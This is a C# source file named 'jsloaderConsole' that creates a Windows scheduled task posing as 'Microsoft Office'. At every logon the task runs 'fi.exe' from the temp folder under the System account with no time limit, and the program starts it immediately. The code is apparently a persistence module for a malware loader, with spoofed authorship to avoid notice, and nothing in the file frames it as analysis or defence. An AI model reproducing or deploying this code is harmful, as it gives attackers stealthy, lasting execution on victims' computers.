 using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using TaskScheduler;
using System.Runtime.InteropServices;
using System.Diagnostics;


namespace jsloaderConsole
{
    class Program
    {
		   static void Main(string[] args)
        {
				TaskSchedulerClass scheduler = new TaskSchedulerClass();
                scheduler.Connect(null, null, null, null);
                ITaskFolder folder = scheduler.GetFolder("\\");
                ITaskDefinition task = scheduler.NewTask(0);
                task.RegistrationInfo.Author = "Microsoft Office";
                task.RegistrationInfo.Description = "OfficerTTAT";
                task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                action.Path = Path.GetTempPath() + "fi.exe";
                task.Settings.ExecutionTimeLimit = "PT0S"; 
                task.Settings.DisallowStartIfOnBatteries = false;
                task.Settings.RunOnlyIfIdle = false;
                IRegisteredTask regTask =
                    folder.RegisterTaskDefinition("OfficerTTAT", task,
                    (int)_TASK_CREATION.TASK_CREATE_OR_UPDATE,
                   "System", 
                    null, 
                    _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                    "");
                IRunningTask runTask = regTask.Run(null);
				
	
        }

    }
}